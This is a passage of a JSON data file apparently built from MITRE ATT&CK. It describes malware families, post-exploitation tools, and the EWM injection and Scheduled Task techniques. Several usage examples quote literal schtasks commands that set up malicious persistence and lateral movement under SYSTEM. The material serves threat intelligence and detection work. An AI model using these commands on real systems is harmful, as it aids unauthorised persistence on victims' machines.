    "description": "[LockerGoga](https://attack.mitre.org/software/S0372) is ransomware that was first reported in January 2019, and has been tied to various attacks on European companies, including industrial and manufacturing firms.(Citation: Unit42 LockerGoga 2019)(Citation: CarbonBlack LockerGoga 2019)",
    "example_uses": []
  },
  "malware--8c050cea-86e1-4b63-bf21-7af4fa483349": {
    "id": "S0339",
    "name": "Micropsia",
    "examples": [],
    "similar_words": [
      "Micropsia"
    ],
    "description": "[Micropsia](https://attack.mitre.org/software/S0339) is a remote access tool written in Delphi.(Citation: Talos Micropsia June 2017)(Citation: Radware Micropsia July 2018)",
    "example_uses": []
  },
  "malware--071d5d65-83ec-4a55-acfa-be7d5f28ba9a": {
    "id": "S0353",
    "name": "NOKKI",
    "examples": [],
    "similar_words": [
      "NOKKI"
    ],
    "description": "[NOKKI](https://attack.mitre.org/software/S0353) is a modular remote access tool. The earliest observed attack using [NOKKI](https://attack.mitre.org/software/S0353) was in January 2018. [NOKKI](https://attack.mitre.org/software/S0353) has significant code overlap with the [KONNI](https://attack.mitre.org/software/S0356) malware family. There is some evidence potentially linking [NOKKI](https://attack.mitre.org/software/S0353) to [APT37](https://attack.mitre.org/groups/G0067).(Citation: Unit 42 NOKKI Sept 2018)(Citation: Unit 42 Nokki Oct 2018)",
    "example_uses": []
  },
  "malware--b4d80f8b-d2b9-4448-8844-4bef777ed676": {
    "id": "S0336",
    "name": "NanoCore",
    "examples": [],
    "similar_words": [
      "NanoCore"
    ],
    "description": "[NanoCore](https://attack.mitre.org/software/S0336) is a modular remote access tool developed in .NET that can be used to spy on victims and steal information. It has been used by threat actors since 2013.(Citation: DigiTrust NanoCore Jan 2017)(Citation: Cofense NanoCore Mar 2018)(Citation: PaloAlto NanoCore Feb 2016)(Citation: Unit 42 Gorgon Group Aug 2018)",
    "example_uses": []
  },
  "malware--5719af9d-6b16-46f9-9b28-fb019541ddbb": {
    "id": "S0368",
    "name": "NotPetya",
    "examples": [],
    "similar_words": [
      "NotPetya",
      "GoldenEye",
      "Petrwrap",
      "Nyetya"
    ],
    "description": "[NotPetya](https://attack.mitre.org/software/S0368) is malware that was used by [Sandworm Team](https://attack.mitre.org/groups/G0034) in a worldwide attack starting on June 27, 2017. While [NotPetya](https://attack.mitre.org/software/S0368) appears as a form of ransomware, its main purpose was to destroy data and disk structures on compromised systems; the attackers never intended to make the encrypted data recoverable. As such, [NotPetya](https://attack.mitre.org/software/S0368) may be more appropriately thought of as a form of wiper malware. [NotPetya](https://attack.mitre.org/software/S0368) contains worm-like features to spread itself across a computer network using the SMBv1 exploits EternalBlue and EternalRomance.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017)(Citation: ESET Telebots June 2017)(Citation: US District Court Indictment GRU Unit 74455 October 2020)",
    "example_uses": []
  },
  "malware--b00f90b6-c75c-4bfd-b813-ca9e6c9ebf29": {
    "id": "S0352",
    "name": "OSX_OCEANLOTUS.D",
    "examples": [],
    "similar_words": [
      "OSX_OCEANLOTUS.D"
    ],
    "description": "[OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) is a macOS backdoor used by [APT32](https://attack.mitre.org/groups/G0050). First discovered in 2015, [APT32](https://attack.mitre.org/groups/G0050) has continued to make improvements using a plugin architecture to extend capabilities, specifically using `.dylib` files. [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) can also determine it's permission level and execute according to access type (`root` or `user`).(Citation: Unit42 OceanLotus 2017)(Citation: TrendMicro MacOS April 2018)(Citation: Trend Micro MacOS Backdoor November 2020)",
    "example_uses": []
  },
  "malware--288fa242-e894-4c7e-ac86-856deedf5cea": {
    "id": "S0346",
    "name": "OceanSalt",
    "examples": [],
    "similar_words": [
      "OceanSalt"
    ],
    "description": "[OceanSalt](https://attack.mitre.org/software/S0346) is a Trojan that was used in a campaign targeting victims in South Korea, United States, and Canada. [OceanSalt](https://attack.mitre.org/software/S0346) shares code similarity with [SpyNote RAT](https://attack.mitre.org/software/S0305), which has been linked to [APT1](https://attack.mitre.org/groups/G0006).(Citation: McAfee Oceansalt Oct 2018)",
    "example_uses": []
  },
  "malware--e2031fd5-02c2-43d4-85e2-b64f474530c2": {
    "id": "S0340",
    "name": "Octopus",
    "examples": [],
    "similar_words": [
      "Octopus"
    ],
    "description": "[Octopus](https://attack.mitre.org/software/S0340) is a Windows Trojan written in the Delphi programming language that has been used by [Nomadic Octopus](https://attack.mitre.org/groups/G0133) to target government organizations in Central Asia since at least 2014.(Citation: Securelist Octopus Oct 2018)(Citation: Security Affairs DustSquad Oct 2018)(Citation: ESET Nomadic Octopus 2018) ",
    "example_uses": []
  },
  "malware--3249e92a-870b-426d-8790-ba311c1abfb4": {
    "id": "S0365",
    "name": "Olympic Destroyer",
    "examples": [],
    "similar_words": [
      "Olympic Destroyer"
    ],
    "description": "[Olympic Destroyer](https://attack.mitre.org/software/S0365) is malware that was used by [Sandworm Team](https://attack.mitre.org/groups/G0034) against the 2018 Winter Olympics, held in Pyeongchang, South Korea. The main purpose of the malware was to render infected computer systems inoperable. The malware leverages various native Windows utilities and API calls to carry out its destructive tasks. [Olympic Destroyer](https://attack.mitre.org/software/S0365) has worm-like features to spread itself across a computer network in order to maximize its destructive impact.(Citation: Talos Olympic Destroyer 2018)(Citation: US District Court Indictment GRU Unit 74455 October 2020) ",
    "example_uses": []
  },
  "malware--e85cae1a-bce3-4ac4-b36b-b00acac0567b": {
    "id": "S0371",
    "name": "POWERTON",
    "examples": [],
    "similar_words": [
      "POWERTON"
    ],
    "description": "[POWERTON](https://attack.mitre.org/software/S0371) is a custom PowerShell backdoor first observed in 2018. It has typically been deployed as a late-stage backdoor by [APT33](https://attack.mitre.org/groups/G0064). At least two variants of the backdoor have been identified, with the later version containing improved functionality.(Citation: FireEye APT33 Guardrail)",
    "example_uses": []
  },
  "malware--ecc2f65a-b452-4eaf-9689-7e181f17f7a5": {
    "id": "S0375",
    "name": "Remexi",
    "examples": [],
    "similar_words": [
      "Remexi"
    ],
    "description": "[Remexi](https://attack.mitre.org/software/S0375) is a Windows-based Trojan that was developed in the C programming language.(Citation: Securelist Remexi Jan 2019)",
    "example_uses": []
  },
  "malware--4d56e6e9-1a6d-46e3-896c-dfdf3cc96e62": {
    "id": "S0370",
    "name": "SamSam",
    "examples": [],
    "similar_words": [
      "SamSam",
      "Samas"
    ],
    "description": "[SamSam](https://attack.mitre.org/software/S0370) is ransomware that appeared in early 2016. Unlike some ransomware, its variants have required operators to manually interact with the malware to execute some of its core components.(Citation: US-CERT SamSam 2018)(Citation: Talos SamSam Jan 2018)(Citation: Sophos SamSam Apr 2018)(Citation: Symantec SamSam Oct 2018)",
    "example_uses": []
  },
  "malware--b45747dc-87ca-4597-a245-7e16a61bc491": {
    "id": "S0345",
    "name": "Seasalt",
    "examples": [],
    "similar_words": [
      "Seasalt"
    ],
    "description": "[Seasalt](https://attack.mitre.org/software/S0345) is malware that has been linked to [APT1](https://attack.mitre.org/groups/G0006)'s 2010 operations. It shares some code similarities with [OceanSalt](https://attack.mitre.org/software/S0346).(Citation: Mandiant APT1 Appendix)(Citation: McAfee Oceansalt Oct 2018)",
    "example_uses": []
  },
  "malware--a5575606-9b85-4e3d-9cd2-40ef30e3672d": {
    "id": "S0374",
    "name": "SpeakUp",
    "examples": [],
    "similar_words": [
      "SpeakUp"
    ],
    "description": "[SpeakUp](https://attack.mitre.org/software/S0374) is a Trojan backdoor that targets both Linux and OSX devices. It was first observed in January 2019. (Citation: CheckPoint SpeakUp Feb 2019)",
    "example_uses": []
  },
  "malware--518bb5f1-91f4-4ff2-b09d-5a94e1ebe95f": {
    "id": "S0333",
    "name": "UBoatRAT",
    "examples": [],
    "similar_words": [
      "UBoatRAT"
    ],
    "description": "[UBoatRAT](https://attack.mitre.org/software/S0333) is a remote access tool that was identified in May 2017.(Citation: PaloAlto UBoatRAT Nov 2017)",
    "example_uses": []
  },
  "malware--75ecdbf1-c2bb-4afc-a3f9-c8da4de8c661": {
    "id": "S0366",
    "name": "WannaCry",
    "examples": [],
    "similar_words": [
      "WannaCry",
      "WanaCry",
      "WanaCrypt",
      "WanaCrypt0r",
      "WCry"
    ],
    "description": "[WannaCry](https://attack.mitre.org/software/S0366) is ransomware that was first seen in a global attack during May 2017, which affected more than 150 countries. It contains worm-like features to spread itself across a computer network using the SMBv1 exploit EternalBlue.(Citation: LogRhythm WannaCry)(Citation: US-CERT WannaCry 2017)(Citation: Washington Post WannaCry 2017)(Citation: FireEye WannaCry 2017)",
    "example_uses": []
  },
  "malware--6a92d80f-cc65-45f6-aa66-3cdea6786b3c": {
    "id": "S0341",
    "name": "Xbash",
    "examples": [],
    "similar_words": [
      "Xbash"
    ],
    "description": "[Xbash](https://attack.mitre.org/software/S0341) is a malware family that has targeted Linux and Microsoft Windows servers. The malware has been tied to the Iron Group, a threat actor group known for previous ransomware attacks. [Xbash](https://attack.mitre.org/software/S0341) was developed in Python and then converted into a self-contained Linux ELF executable by using PyInstaller.(Citation: Unit42 Xbash Sept 2018)",
    "example_uses": []
  },
  "malware--198db886-47af-4f4c-bff5-11b891f85946": {
    "id": "S0330",
    "name": "Zeus Panda",
    "examples": [],
    "similar_words": [
      "Zeus Panda"
    ],
    "description": "[Zeus Panda](https://attack.mitre.org/software/S0330) is a Trojan designed to steal banking information and other sensitive credentials for exfiltration. [Zeus Panda](https://attack.mitre.org/software/S0330)’s original source code was leaked in 2011, allowing threat actors to use its source code as a basis for new malware variants. It is mainly used to target Windows operating systems ranging from Windows XP through Windows 10.(Citation: Talos Zeus Panda Nov 2017)(Citation: GDATA Zeus Panda June 2017)",
    "example_uses": []
  },
  "malware--54e8672d-5338-4ad1-954a-a7c986bee530": {
    "id": "S0350",
    "name": "zwShell",
    "examples": [],
    "similar_words": [
      "zwShell"
    ],
    "description": "[zwShell](https://attack.mitre.org/software/S0350) is a remote access tool (RAT) written in Delphi that has been seen in the wild since the spring of 2010 and used by threat actors during [Night Dragon](https://attack.mitre.org/campaigns/C0002).(Citation: McAfee Night Dragon)",
    "example_uses": []
  },
  "tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3": {
    "id": "S0363",
    "name": "Empire",
    "examples": [],
    "similar_words": [
      "Empire",
      "EmPyre",
      "PowerShell Empire"
    ],
    "description": "[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1059/001) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)",
    "example_uses": []
  },
  "tool--ca656c25-44f1-471b-9d9f-e2a3bbb84973": {
    "id": "S0361",
    "name": "Expand",
    "examples": [],
    "similar_words": [
      "Expand"
    ],
    "description": "[Expand](https://attack.mitre.org/software/S0361) is a Windows utility used to expand one or more compressed CAB files.(Citation: Microsoft Expand Utility) It has been used by [BBSRAT](https://attack.mitre.org/software/S0127) to decompress a CAB file into executable content.(Citation: Palo Alto Networks BBSRAT)",
    "example_uses": []
  },
  "tool--26c87906-d750-42c5-946c-d4162c73fc7b": {
    "id": "S0357",
    "name": "Impacket",
    "examples": [],
    "similar_words": [
      "Impacket"
    ],
    "description": "[Impacket](https://attack.mitre.org/software/S0357) is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols. [Impacket](https://attack.mitre.org/software/S0357) contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.(Citation: Impacket Tools)",
    "example_uses": []
  },
  "tool--b76b2d94-60e4-4107-a903-4a3a7622fb3b": {
    "id": "S0349",
    "name": "LaZagne",
    "examples": [],
    "similar_words": [
      "LaZagne"
    ],
    "description": "[LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) is publicly available on GitHub.(Citation: GitHub LaZagne Dec 2018)",
    "example_uses": []
  },
  "tool--981acc4c-2ede-4b56-be6e-fa1a75f37acf": {
    "id": "S0359",
    "name": "Nltest",
    "examples": [],
    "similar_words": [
      "Nltest"
    ],
    "description": "[Nltest](https://attack.mitre.org/software/S0359) is a Windows command-line utility used to list domain controllers and enumerate domain trusts.(Citation: Nltest Manual)",
    "example_uses": []
  },
  "tool--4b57c098-f043-4da2-83ef-7588a6d426bc": {
    "id": "S0378",
    "name": "PoshC2",
    "examples": [],
    "similar_words": [
      "PoshC2"
    ],
    "description": "[PoshC2](https://attack.mitre.org/software/S0378) is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in [PowerShell](https://attack.mitre.org/techniques/T1059/001). Although [PoshC2](https://attack.mitre.org/software/S0378) is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.(Citation: GitHub PoshC2)",
    "example_uses": []
  },
  "tool--3ffbdc1f-d2bf-41ab-91a2-c7b857e98079": {
    "id": "S0364",
    "name": "RawDisk",
    "examples": [],
    "similar_words": [
      "RawDisk"
    ],
    "description": "[RawDisk](https://attack.mitre.org/software/S0364) is a legitimate commercial driver from the EldoS Corporation that is used for interacting with files, disks, and partitions. The driver allows for direct modification of data on a local computer's hard drive. In some cases, the tool can enact these raw disk modifications from user-mode processes, circumventing Windows operating system security features.(Citation: EldoS RawDisk ITpro)(Citation: Novetta Blockbuster Destructive Malware)",
    "example_uses": []
  },
  "tool--7cd0bc75-055b-4098-a00e-83dc8beaff14": {
    "id": "S0332",
    "name": "Remcos",
    "examples": [],
    "similar_words": [
      "Remcos"
    ],
    "description": "[Remcos](https://attack.mitre.org/software/S0332) is a closed-source tool that is marketed as a remote control and surveillance software by a company called Breaking Security. [Remcos](https://attack.mitre.org/software/S0332) has been observed being used in malware campaigns.(Citation: Riskiq Remcos Jan 2018)(Citation: Talos Remcos Aug 2018)",
    "example_uses": []
  },
  "tool--90ac9266-68ce-46f2-b24f-5eb3b2a8ea38": {
    "id": "S0358",
    "name": "Ruler",
    "examples": [],
    "similar_words": [
      "Ruler"
    ],
    "description": "[Ruler](https://attack.mitre.org/software/S0358) is a tool to abuse Microsoft Exchange services. It is publicly available on GitHub and the tool is executed via the command line. The creators of [Ruler](https://attack.mitre.org/software/S0358) have also released a defensive tool, NotRuler, to detect its usage.(Citation: SensePost Ruler GitHub)(Citation: SensePost NotRuler)",
    "example_uses": []
  },
  "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298": {
    "name": "Extra Window Memory Injection",
    "example_uses": [
      "has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process.",
      "overwrites Explorers Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe."
    ],
    "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the processs memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the processs EWM.Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
    "similar_words": [
      "Extra Window Memory Injection"
    ],
    "id": "T1055.011"
  },
  "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9": {
    "name": "Scheduled Task",
    "example_uses": [
      "has used scheduled tasks to maintain persistence.",
      "has the ability to launch scheduled tasks to establish persistence.",
      "has used scheduled tasks to maintain persistence.",
      "During the   used `scheduler` and `schtasks` to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.  also created a scheduled task to maintain  persistence when the host booted.",
      "can use a scheduled task for installation.",
      "has used a scheduled task for persistence.",
      "An  downloader creates persistence by creating the following scheduled task: schtasks /create /tn mysc /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru System.",
      "can establish persistence on a targeted host with scheduled tasks.",
      "has the ability to use scheduled tasks for execution.",
      "creates a scheduled task on the system that provides persistence.",
      "creates several tasks for later execution to continue persistence on the victims machine.",
      "has used a scheduled task to launch its PowerShell loader.",
      "has registered itself as a scheduled task to run each time the current user logs in.",
      "has created Windows tasks to establish persistence.",
      "has used scheduled tasks to stage its operation.",
      "has used scheduled tasks to invoke Cobalt Strike including through batch script schtasks /create /ru SYSTEM /tn update /tr cmd /c c:\\windows\\temp\\update.bat /sc once /f /st and to maintain persistence.",
      "A  file stealer can run a TaskScheduler DLL to add persistence.",
      "establishes persistence by creating a scheduled task with the command SchTasks /Create /SC DAILY /TN BigData /TR  + path_file + /ST 09:30.",
      "malware has created scheduled tasks to establish persistence.",
      "has been executed via a scheduled task.",
      "can create a scheduled task for persistence.",
      "has the ability to set persistence using the Task Scheduler.",
      "has used scheduled tasks to establish persistence for installed tools.",
      "established persistence for  by created a scheduled task.",
      "can create a scheduled task named `RecoveryExTask` to gain persistence.",
      "The different components of  are executed by Windows Task Scheduler.",
      "has used a scheduled task to establish persistence for a keylogger.",
      "has created a scheduled task to execute additional malicious software as well as maintain persistence.",
      "has a persistence component to write a scheduled task for the payload.",
      "creates a task to reboot the system one hour after infection.",
      "has used scheduled tasks to establish persistence and execution.",
      "During the   leveraged Scheduled Tasks through a Group Policy Object (GPO) to execute  at a predetermined time.",
      "has used SchTasks for execution.",
      "utilizes scheduled tasks as a persistence mechanism.",
      "has been executed on a target system through a scheduled task created by  using .",
      "During   used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: `\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor` `\\Microsoft\\Windows\\Ras\\ManagerMobility` `\\Microsoft\\Windows\\WDI\\SrvSetupResults` and `\\Microsoft\\Windows\\WDI\\USOShared`.",
      "has created scheduled tasks in the `C:\\Windows` directory of the compromised network.",
      "During  the threat actors established persistence through a scheduled task using the command: `/Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR` named WinUpdate",
      "can use `schtasks.exe` to gain persistence.",
      "can maintain persistence via the creation of scheduled tasks within system directories such as `windows\\system32\\` `windows\\syswow64` `winnt\\system32` and `winnt\\syswow64`.",
      "has used scheduled tasks to execute discovery commands and scripts for collection.",
      "has used Windows Scheduled Tasks to establish persistence on local and remote hosts.",
      "has created scheduled tasks to persistently run VBScripts.",
      "installer can attempt to achieve persistence by creating a scheduled task.",
      "can schedule tasks via the Windows COM API to maintain persistence.",
      "has the ability to persist using scheduled tasks.",
      "has used `SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR [path to self] /ST 10:00` to establish persistence.",
      "s infpub.dat file creates a scheduled task to launch a malicious executable.",
      "has created a scheduled task that executes every hour to establish persistence.",
      "has used named and hijacked scheduled tasks to establish persistence.",
      "can create scheduled tasks to execute reverse shells that read and write data to and from specified SMB shares.",
      "can use the schtasks utility to bypass UAC.",
      "creates a scheduled task to establish by executing a malicious payload every subsequent minute.",
      "has created scheduled tasks for persistence.",
      "has used scheduled tasks to maintain RDP backdoors.",
      "has the ability to achieve persistence by adding a new task in the task scheduler to run every minute.",
      "has used scheduled tasks to establish persistence for  and other malware.",
      "has used scheduled tasks for persistence and execution.",
      "In the   installed scheduled tasks defined in XML files.",
      "has established persistence by creating the following scheduled task schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\\%USERPROFILE%\\Downloads\\spread.exe /F.",
      "has created a scheduled task named Maintenance to establish persistence.",
      "dropped and added officeupdate.exe to scheduled tasks.",
      "creates a scheduled task to ensure it is re-executed everyday.",
      "used a compromised account to create a scheduled task on a system.",
      "can gain persistence through use of scheduled tasks.",
      "launched a scheduled task to gain persistence using the schtasks /create /sc command.",
      "persists using a scheduled task that executes every minute.",
      "embedded the commands schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I inside a batch script.",
      "has maintained persistence through a scheduled task.",
      "execution begins from a scheduled task named `Microsoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeAll` and it creates a separate scheduled task called `mstask` to run the wiper only once at 23:55:00.",
      "During  the threat actors used scheduled tasks to download backdoor tools.",
      "During   created scheduled tasks to set a periodic execution of a remote XSL script.",
      "is able to create hidden scheduled tasks for persistence.",
      "During  the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command: `SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM.`",
      "has created scheduled tasks to maintain 's persistence.",
      "tries to add a scheduled task to establish persistence.",
      "has created scheduled tasks called `MicrosoftInternetExplorerCrashRepoeterTaskMachineUA` and `MicrosoftEdgeCrashRepoeterTaskMachineUA` which were configured to execute `CrashReporter.exe` during user logon.",
      "has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.",
      "has used schtasks.exe for lateral movement in compromised networks.",
      "copies an executable payload to the target system by using  and then scheduling an unnamed task to execute the malware.",
      "has used a task XML file named mssch.xml to run an IronPython script when a user logs in or when specific system events are created.",
      "New-UserPersistenceOption Persistence argument can be used to establish via a .",
      "has achieved persistence via scheduled tasks.",
      "has used scheduled tasks to persist on victim systems.",
      "installer plugin can schedule a new task that loads the dispatcher on boot/logon.",
      "has used Scheduled Tasks for persistence and to load and execute a reverse proxy binary.",
      "has created a scheduled task to execute a .vbe file multiple times a day.",
      "can remotely create a scheduled task to execute itself on a system.",
      "has executed commands via scheduled tasks.",
      "has created scheduled tasks that run a VBScript to execute a payload on victim machines.",
      "has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence.",
      "has created scheduled tasks using name variants such as Windows Update Security Windows Update Security Patches and Google Chrome Security Update to launch  at a specific time.",
      "has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.",
      "has used a macro function to set scheduled tasks disguised as those used by Google.",
      "can execute commands remotely by creating a new schedule task on the remote system",
      "has created a scheduled SYSTEM task that runs when a user logs in.",
      "One persistence mechanism used by  is to register itself as a scheduled task.",
      "has used scheduled tasks to establish persistence for various malware it uses including downloaders known as HARDTACK and SHIPBREAD and .",
      "can use scheduled tasks to achieve persistence.",
      "has created scheduled tasks to establish persistence for their tools.",
      "can run on a daily basis using a scheduled task.",
      "During  threat actors used scheduled tasks to execute malicious PowerShell code on remote systems.",
      "has established persistence through a scheduled task using the command C:\\Windows\\system32\\schtasks.exe /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe.",
      "has used scheduled tasks to execute additional payloads and to gain persistence on a compromised host.",
      "has used schtasks for persistence including through the periodic execution of a remote XSL script or a dropped VBS payload.",
      "has used  to register a scheduled task to execute malware during lateral movement.",
      "can use scheduled tasks for persistence.",
      "Adversaries can instruct  to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.",
      "has used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.",
      "has the ability to use scheduled tasks to repeatedly execute malicious payloads on a compromised host.",
      "can create a scheduled task to establish persistence.",
      "has modules to interact with the Windows task scheduler.",
      "During the  campaign  used scheduled task XML triggers.",
      "has used scheduled tasks to establish persistence.",
      "has created scheduled tasks in %appdata%\\Roaming\\Microsoft\\Templates\\.",
      "creates a scheduled task to run itself every three minutes.",
      "can achieve persistence by copying its DLL to a subdirectory of %APPDATA% and creating a Visual Basic Script that will load the DLL via a scheduled task.",
      "can create a scheduled task for persistence.",
      "can establish persistence by adding a Scheduled Task named Microsoft Boost Kernel Optimization.",
      "has used sctasks for persistence.",
      "contains modules that will use  to carry out malicious operations.",
      "can create a scheduled task to run every minute for persistence.",
      "has created scheduled tasks to launch executables after a designated number of minutes have passed.",
      "has created a scheduled task for persistence.",
      "has downloaded additional malware with scheduled tasks.",
      "schedules tasks to invoke its components in order to establish persistence.",
      "schedules a network job to execute two minutes after host infection.",
      "has used scheduled tasks named MSST and \\Microsoft\\Windows\\Autochk\\Scheduled to establish persistence.",
      "uses scheduled tasks typically named Watchmon Service for persistence.",
      "malware creates a scheduled task entitled IE Web Cache to execute a malicious file hourly.",
      "has used scheduled tasks for persistence and execution.",
      "has the ability to create scheduled tasks for persistence.",
      "persists through a scheduled task that executes it every minute.",
      "schedules tasks to run malicious scripts at different intervals.",
      "can establish persistence by creating a scheduled task.",
      "has created scheduled tasks to maintain persistence on a compromised host.",
      "creates scheduled tasks to establish persistence.",
      "is used to schedule tasks on a Windows system to run at a specific date and time.",
      "contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot.",
      "has the ability to maintain persistence by creating scheduled tasks set to run every hour.",
      "can create a scheduled task to enable persistence mechanisms.",
      "launches a scheduled task.",
      "has created scheduled tasks to run malicious scripts on a compromised host.",
      "has used scheduled tasks to add persistence.",
      "has a command to create a scheduled task for persistence.",
      "can create a scheduled task to maintain persistence on system start-up.",
      "has attempted to install a scheduled task named Java Maintenance64 on startup to establish persistence.",
      "creates a scheduled task to maintain persistence on the victims machine.",
      "has attempted to use scheduled tasks for persistence in victim environments.",
      "leveraged SHARPIVORY a .NET dropper that writes embedded payload to disk and uses scheduled tasks to persist on victim machines.",
      "can create scheduled tasks for persistence.",
      "uses scheduled tasks for persistence to load the final malware payload into memory.",
      "has created a scheduled task to establish persistence.",
      "has created a scheduled task named `CalendarChecker` to establish persistence.",
      "can use the Windows `SilentCleanup` scheduled task to enable payload execution.",
      "uses remotely scheduled tasks to facilitate remote command execution on victim machines.",
      "has maintained persistence through a scheduled task e.g. though a .dll file in the Registry.",
      "used scheduled tasks for program execution during initial access to victim machines.",
      "executed PowerShell scripts that would subsequently attempt to establish persistence by creating scheduled tasks objects to periodically retrieve and execute remotely-hosted payloads.",
      "achieves persistence by creating a scheduled task such as MicrosoftCrashHandlerUAC.",
      "creates a malicious scheduled task that launches a batch file to remove Windows Event Logs.",
      "creates scheduled tasks for persistence based on the operating system version of the victim machine.",
      "can create scheduled tasks named Earth and Venus which run every 30 and 40 seconds respectively to support C2 and exfiltration.",
      "can be executed via scheduled task.",
      "created scheduled tasks for payload execution.",
      "During   used VBS droppers to schedule tasks for persistence.",
      "can persist via scheduled tasks.",
      "persists via scheduled tasks.",
      "creates a schedule task to execute remotely deployed ransomware payloads.",
      "has used scheduled tasks for persistence.",
      "has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence. Additionally  has used living-off-the-land scripts to execute a malicious script via a scheduled task.",
      "can create a scheduled task to run every 32 seconds to communicate with C2 and execute received commands."
    ],
    "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)Adversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",
    "similar_words": [
      "Scheduled Task"
    ],
    "id": "T1053.005"
  },
  "attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520": {
    "name": "Socket Filters",
    "example_uses": [
      "can listen and evaluate incoming commands on the domain socket created by PITHOOK malware located at `/data/runtime/cockpit/wd.fd` for a predefined magic byte sequence.  can then duplicate the socket for further communication over TLS.",
